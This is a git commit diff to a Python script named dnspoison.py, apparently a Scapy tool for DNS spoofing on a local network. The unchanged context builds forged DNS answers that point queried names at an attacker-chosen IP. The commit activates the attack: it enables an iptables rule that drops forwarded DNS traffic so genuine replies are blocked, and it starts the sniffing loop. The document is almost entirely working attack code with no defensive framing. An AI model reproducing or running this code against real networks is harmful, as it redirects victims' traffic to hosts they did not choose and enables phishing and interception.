d0ea8ef321e7f7255decdfcf2edb70b31bd3c3ed
m4ul <hansonlucas06@gmail.com>
2022-11-12 18:17:21 +0100

    dns update

--- dnspoison.py
+++ dnspoison.py
@@ -14,9 +14,9 @@ def spoofDNS(packet):
             spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
             sendp(spoof, count=1)
 
+
 if __name__ == '__main__':
-    #Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
-    #sniffDNS()
-    print("hello")
+    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
+    sniffDNS()
 
     
